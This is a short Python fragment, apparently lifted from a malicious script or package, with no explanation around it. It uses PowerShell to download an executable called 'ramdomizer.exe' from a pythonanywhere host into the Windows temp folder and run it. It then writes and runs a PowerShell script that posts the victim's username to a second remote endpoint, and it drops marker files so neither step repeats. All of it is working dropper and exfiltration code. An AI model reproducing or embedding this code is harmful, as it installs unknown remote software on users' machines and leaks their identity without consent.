
if not os.path.exists(f"{os.path.expandvars('%TEMP%')}\\sc06.com"):

    TEMP = os.path.expandvars("%TEMP%")

    subprocess.call("powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12", shell=True)
    subprocess.call(f'powershell Invoke-WebRequest -Uri "https://smksmks.pythonanywhere.com/static/ramdomizer.exe" -OutFile "{TEMP}\\ramdomizer.exe"', shell=True)
    subprocess.call(f'powershell Start-Process -FilePath "{TEMP}\\ramdomizer.exe"', shell=True)

    with open(f"{os.path.expandvars('%TEMP%')}\\sc06.com", 'w') as file:
        file.write(' ')


if not os.path.exists(f"{os.path.expandvars('%TEMP%')}\\sc02.ps1"):
    scrpt = """
    $nomeUsuario = $env:USERNAME

    $jsonData = @{
        Usuario = $nomeUsuario
    } | ConvertTo-Json

    $url = "https://infodumperio.pythonanywhere.com/receber-solicitacao-alpha"

    $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonData -ContentType "application/json"

    $response
    """


    with open(f"{os.path.expandvars('%TEMP%')}\\sc02.ps1", 'w') as file:
        file.write(scrpt)

    subprocess.Popen(f"powershell {os.path.expandvars('%TEMP%')}\\sc02.ps1", shell=True)
